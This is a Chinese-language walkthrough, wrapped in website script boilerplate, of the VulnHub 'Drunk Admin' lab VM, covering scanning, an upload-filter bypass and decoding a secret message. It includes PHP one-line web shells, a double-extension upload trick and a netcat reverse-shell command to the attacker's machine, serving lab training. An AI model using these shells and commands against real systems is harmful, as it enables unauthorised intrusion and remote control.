@@ -1,0 +1,530 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <h2>下载地址<br /></h2>
+<p><a href="http://21ltr.com/scenes/21LTR.com_Scene1_2.120_v1.0.iso"></a></p>
+<pre>https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip<br /></pre>
+<h2>任务信息</h2>
+<pre>Reveal the hidden message for a date arrange that Bob sent to Alice.<br /></pre>
+<h2>实战演练</h2>
+<p>下载完成后解压试用VMware虚拟机打开，可以看到登录界面，不需要登录,IP是DHCP(192.168.199.100)。</p>
+<h3><img alt="image.png" data-original="images/20190226/1551148830_5c74a71ed49f1.png" src="images/20190226/1551148830_5c74a71ed49f1.png" width="667" height="471" />信息收集</h3>
+<noscript><img alt="image.png" src="images/20190226/1551148830_5c74a71ed49f1.png" width="667" height="471" />信息收集</h3></noscript>
+<pre>root@kali:~# nmap -sV 192.168.199.100 -p1-65535
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 21:41 EST
+Nmap scan report for 192.168.199.100
+Host is up (0.00051s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze1 (protocol 2.0)
+8880/tcp open  http    Apache httpd 2.2.16 ((Debian))
+MAC Address: 00:0C:29:CB:0D:16 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 156.51 seconds</pre>
+<p>在浏览器打开<a href="http://192.168.199.100:8880">http://192.168.199.100:8880</a></p>
+<p><img alt="image.png" data-original="images/20190226/1551149308_5c74a8fc707ff.png" src="images/20190226/1551149308_5c74a8fc707ff.png" width="690" height="287" /></p>
+<noscript><img alt="image.png" src="images/20190226/1551149308_5c74a8fc707ff.png" width="690" height="287" /></p></noscript>
+<pre>root@kali:~# nikto -h 192.168.199.100 -p 8880
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.199.100
++ Target Hostname:    192.168.199.100
++ Target Port:        8880
++ Start Time:         2019-02-25 21:50:02 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.16 (Debian)
++ Retrieved x-powered-by header: PHP/5.3.3-7+squeeze8
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie trypios created without the httponly flag
+Illegal hexadecimal digit ';' ignored at /var/lib/nikto/plugins/nikto_headers.plugin line 106.
++ Server leaks inodes via ETags, header found with file /ef2gieEf.tcl, inode: 0x723b2, size: 0x33, mtime: 0x4ba515bf8ec40;4bcb127742900
++ Apache/2.2.16 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /info/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8348 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2019-02-25 21:50:26 (GMT-5) (24 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+</pre>
+<pre>root@kali:~# dirb http://192.168.199.100:8880/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Feb 25 21:46:19 2019
+URL_BASE: http://192.168.199.100:8880/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.199.100:8880/ ----
++ http://192.168.199.100:8880/cgi-bin/ (CODE:403|SIZE:293)                                                                                                                                                        
++ http://192.168.199.100:8880/image (CODE:200|SIZE:1392)                                                                                                                                                          
+==&gt; DIRECTORY: http://192.168.199.100:8880/images/                                                                                                                                                                
++ http://192.168.199.100:8880/index (CODE:200|SIZE:1638)                                                                                                                                                          
++ http://192.168.199.100:8880/index.php (CODE:200|SIZE:1638)                                                                                                                                                      
++ http://192.168.199.100:8880/info (CODE:200|SIZE:1600)                                                                                                                                                           
++ http://192.168.199.100:8880/info.php (CODE:200|SIZE:1600)                                                                                                                                                       
++ http://192.168.199.100:8880/server-status (CODE:403|SIZE:51)                                                                                                                                                    
+==&gt; DIRECTORY: http://192.168.199.100:8880/style/                                                                                                                                                                 
++ http://192.168.199.100:8880/upload (CODE:200|SIZE:57)                                                                                                                                                           
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.199.100:8880/images/ ----
++ http://192.168.199.100:8880/images/admin.php (CODE:403|SIZE:51)                                                                                                                                                 
++ http://192.168.199.100:8880/images/index (CODE:200|SIZE:0)                                                                                                                                                      
++ http://192.168.199.100:8880/images/index.html (CODE:200|SIZE:0)                                                                                                                                                 
++ http://192.168.199.100:8880/images/index.php (CODE:403|SIZE:51)                                                                                                                                                 
++ http://192.168.199.100:8880/images/info.php (CODE:403|SIZE:51)                                                                                                                                                  
++ http://192.168.199.100:8880/images/phpinfo.php (CODE:403|SIZE:51)                                                                                                                                               
++ http://192.168.199.100:8880/images/xmlrpc.php (CODE:403|SIZE:51)                                                                                                                                                
++ http://192.168.199.100:8880/images/xmlrpc_server.php (CODE:403|SIZE:51)                                                                                                                                         
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.199.100:8880/style/ ----
++ http://192.168.199.100:8880/style/bullet (CODE:200|SIZE:989)                                                                                                                                                    
++ http://192.168.199.100:8880/style/index (CODE:200|SIZE:0)                                                                                                                                                       
++ http://192.168.199.100:8880/style/index.html (CODE:200|SIZE:0)                                                                                                                                                  
++ http://192.168.199.100:8880/style/style (CODE:200|SIZE:5757)                                                                                                                                                    
+                                                                                                                                                                                                                  
+-----------------
+END_TIME: Mon Feb 25 21:46:28 2019
+DOWNLOADED: 13836 - FOUND: 20</pre>
+<p>发现了这几个文件</p>
+<pre>+ http://192.168.199.100:8880/images/admin.php (CODE:403|SIZE:51)                                                                                                                                                 
++ http://192.168.199.100:8880/images/index (CODE:200|SIZE:0)                                                                                                                                                      
++ http://192.168.199.100:8880/images/index.html (CODE:200|SIZE:0)                                                                                                                                                 
++ http://192.168.199.100:8880/images/index.php (CODE:403|SIZE:51)                                                                                                                                                 
++ http://192.168.199.100:8880/images/info.php (CODE:403|SIZE:51)                                                                                                                                                  
++ http://192.168.199.100:8880/images/phpinfo.php (CODE:403|SIZE:51)                                                                                                                                               
++ http://192.168.199.100:8880/images/xmlrpc.php (CODE:403|SIZE:51)                                                                                                                                                
++ http://192.168.199.100:8880/images/xmlrpc_server.php (CODE:403|SIZE:51)  </pre>
+<p>打开发现，被调戏了</p>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551149718_5c74aa964ad28.png" src="images/20190226/1551149718_5c74aa964ad28.png" width="690" height="313" /></p>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551149718_5c74aa964ad28.png" width="690" height="313" /></p></noscript>
+<h3>测试</h3>
+<div>在首页看到是一个上传文件功能，还有右下角的一个php超链接。</div>
+<div>我们先从php那边开始</div>
+<pre>http://192.168.199.100:8880/myphp.php?id=102</pre>
+<div>找到这个</div>
+<pre>http://192.168.199.100:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</pre>
+<div>我们用burpsuite进行遍历一下id，发现这几个ID只是显示phpinfo的信息。</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551150588_5c74adfce9eef.png" src="images/20190226/1551150588_5c74adfce9eef.png" width="690" height="399" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551150588_5c74adfce9eef.png" width="690" height="399" /></div></noscript>
+<div>试一下会不会存在注入或者文件包含漏洞</div>
+<pre>另外一个链接也不存在这些漏洞，看来只能从上传入手。</pre>
+<div>上传正常的图片</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551154486_5c74bd36e5598.png" src="images/20190226/1551154486_5c74bd36e5598.png" width="690" height="550" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551154486_5c74bd36e5598.png" width="690" height="550" /></div></noscript>
+<div>使用一句话木马保存成.php上传试试 <span style="color:rgb(51,51,51);">&lt;?php @eval($_POST[value]);?&gt;</span></div>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551154649_5c74bdd9d7163.png" src="images/20190226/1551154649_5c74bdd9d7163.png" width="690" height="418" /><br /></span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551154649_5c74bdd9d7163.png" width="690" height="418" /><br /></span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551154661_5c74bde5414f8.png" src="images/20190226/1551154661_5c74bde5414f8.png" width="690" height="255" />试试加上图片头</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551154661_5c74bde5414f8.png" width="690" height="255" />试试加上图片头</span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551155355_5c74c09b5b8f4.png" src="images/20190226/1551155355_5c74c09b5b8f4.png" width="668" height="204" /><br /></span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155355_5c74c09b5b8f4.png" width="668" height="204" /><br /></span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155730_5c74c21298ab8.png" width="690" height="51" /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155760_5c74c23088a84.png" width="670" height="418" />加入一句话木马<br /><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551155855_5c74c28fa6026.png" src="images/20190226/1551155855_5c74c28fa6026.png" width="500" height="68" />然后被调戏了</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155730_5c74c21298ab8.png" width="690" height="51" /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155760_5c74c23088a84.png" width="670" height="418" />加入一句话木马<br /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155855_5c74c28fa6026.png" width="500" height="68" />然后被调戏了</span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551155909_5c74c2c5907c1.png" src="images/20190226/1551155909_5c74c2c5907c1.png" width="594" height="200" />试一下是不是识别了某些关键字</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551155909_5c74c2c5907c1.png" width="594" height="200" />试一下是不是识别了某些关键字</span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551156016_5c74c3309c76b.png" src="images/20190226/1551156016_5c74c3309c76b.png" width="273" height="47" />可以上传</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156016_5c74c3309c76b.png" width="273" height="47" />可以上传</span></div></noscript>
+<p>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551156077_5c74c36db9448.png" src="images/20190226/1551156077_5c74c36db9448.png" width="690" height="347" />再测试某些关键字</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156077_5c74c36db9448.png" width="690" height="347" />再测试某些关键字</span></div></noscript>
+<div>passthru，拦截</div>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551156484_5c74c504e3c84.png" src="images/20190226/1551156484_5c74c504e3c84.png" width="516" height="37" />exec，上传成功</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156484_5c74c504e3c84.png" width="516" height="37" />exec，上传成功</span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551156680_5c74c5c8e6411.png" src="images/20190226/1551156680_5c74c5c8e6411.png" width="505" height="37" /></span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156680_5c74c5c8e6411.png" width="505" height="37" /></span></div></noscript>
+<div><span style="color:rgb(51,51,51);">system，上传成功</span></div>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551156731_5c74c5fbf02b6.png" src="images/20190226/1551156731_5c74c5fbf02b6.png" width="508" height="42" />总结来说，应该有些关键字设置了黑名单（猜测）</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156731_5c74c5fbf02b6.png" width="508" height="42" />总结来说，应该有些关键字设置了黑名单（猜测）</span></div></noscript>
+<div><span style="color:rgb(51,51,51);">打开shell的地址，发现不能执行</span></div>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156944_5c74c6d0d8776.png" width="690" height="102" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551156961_5c74c6e1b8801.png" src="images/20190226/1551156961_5c74c6e1b8801.png" width="690" height="100" />emmmm，陷入僵局，我们看到图片的名字是一串加密字符串，看看有没有规律</span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156944_5c74c6d0d8776.png" width="690" height="102" /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551156961_5c74c6e1b8801.png" width="690" height="100" />emmmm，陷入僵局，我们看到图片的名字是一串加密字符串，看看有没有规律</span></div></noscript>
+<div><span style="color:rgb(51,51,51);"><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551157134_5c74c78eccbe5.png" src="images/20190226/1551157134_5c74c78eccbe5.png" width="690" height="310" /><br /></span></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551157134_5c74c78eccbe5.png" width="690" height="310" /><br /></span></div></noscript>
+<p>后来发现能直接上传php代码，不用加图片头。。。
+<div></div>
+<div><b>解析漏洞</b></p>
+<div>只要将名字改成shell.png.php就可以上传</div>
+<pre>&lt;?php echo exec($_REQUEST['cmd'])  ?&gt;</pre>
+</div>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551169486_5c74f7ce85930.png" width="666" height="451" /><br /><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551169813_5c74f915587fc.png" src="images/20190226/1551169813_5c74f915587fc.png" width="690" height="260" />
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551169486_5c74f7ce85930.png" width="666" height="451" /><br /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551169813_5c74f915587fc.png" width="690" height="260" /></noscript>这个trypios就是上传后的文件名
+<div></div>
+</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551169850_5c74f93ad63ed.png" src="images/20190226/1551169850_5c74f93ad63ed.png" width="690" height="172" />kali使用nc监听 </div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551169850_5c74f93ad63ed.png" width="690" height="172" />kali使用nc监听 </div></noscript>
+<div>
+<pre>nc+192.168.199.176+9999+-e+/bin/bash</pre>
+<p></div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551174993_5c750d51d2f7f.png" src="images/20190226/1551174993_5c750d51d2f7f.png" width="690" height="363" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551174993_5c750d51d2f7f.png" width="690" height="363" /></div></noscript>
+<div>然后就可以查看信息</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551175155_5c750df3b4cf2.png" src="images/20190226/1551175155_5c750df3b4cf2.png" width="351" height="406" />找到解密文件，将它移动到http目录</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551175155_5c750df3b4cf2.png" width="351" height="406" />找到解密文件，将它移动到http目录</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551176850_5c75149209959.png" src="images/20190226/1551176850_5c75149209959.png" width="690" height="796" />打开浏览器，发现打开不了，于是就直接下载代码到本地运行</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551176850_5c75149209959.png" width="690" height="796" />打开浏览器，发现打开不了，于是就直接下载代码到本地运行</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551178046_5c75193eb5eef.png" src="images/20190226/1551178046_5c75193eb5eef.png" width="690" height="313" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178046_5c75193eb5eef.png" width="690" height="313" /></div></noscript>
+<div></div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551178046_5c75193eb71e3.png" src="images/20190226/1551178046_5c75193eb71e3.png" width="690" height="355" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178046_5c75193eb71e3.png" width="690" height="355" /></div></noscript>
+<div>kali本地运行apache</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551178042_5c75193a77386.png" src="images/20190226/1551178042_5c75193a77386.png" width="566" height="290" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178042_5c75193a77386.png" width="566" height="290" /></div></noscript>
+<div>解密失败</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551178114_5c751982c57e6.png" src="images/20190226/1551178114_5c751982c57e6.png" width="690" height="108" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178114_5c751982c57e6.png" width="690" height="108" /></div></noscript>
+<div></div>
+<div>index.php</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551178300_5c751a3c79fc1.png" src="images/20190226/1551178300_5c751a3c79fc1.png" width="690" height="376" />还记得我们刚刚找到那个信息吗？</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178300_5c751a3c79fc1.png" width="690" height="376" />还记得我们刚刚找到那个信息吗？</div></noscript>
+</p>
+<pre class="selected">#########################
+
+# Drunk Admin Challenge #
+
+#     by @anestisb	#
+
+#########################
+
+bob&gt; Great work.
+
+bob&gt; Meet me there.
+
+...&gt; ?
+
+bob&gt; What? You don't know where?
+
+bob&gt; Work a little more your post
+
+     exploitation skills.
+
+Secret Code:
+
+TGglMUxecjJDSDclN1Ej
+
+Mail me your methods at:
+
+anestis@bechtsoudis.com
+</pre>
+<p>这个secret code是用base64加密
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178806_5c751c3670291.png" width="690" height="186" /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178840_5c751c587ec65.png" width="655" height="357" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551178861_5c751c6d16c61.png" src="images/20190226/1551178861_5c751c6d16c61.png" width="690" height="186" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178806_5c751c3670291.png" width="690" height="186" /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178840_5c751c587ec65.png" width="655" height="357" /><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551178861_5c751c6d16c61.png" width="690" height="186" /></div></noscript>
+<div>打开Google地图，查找坐标</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190226/1551179345_5c751e515b8b8.png" src="images/20190226/1551179345_5c751e515b8b8.png" width="690" height="277" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190226/1551179345_5c751e515b8b8.png" width="690" height="277" /></div></noscript>
+<p></p>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num"></p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="196648" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
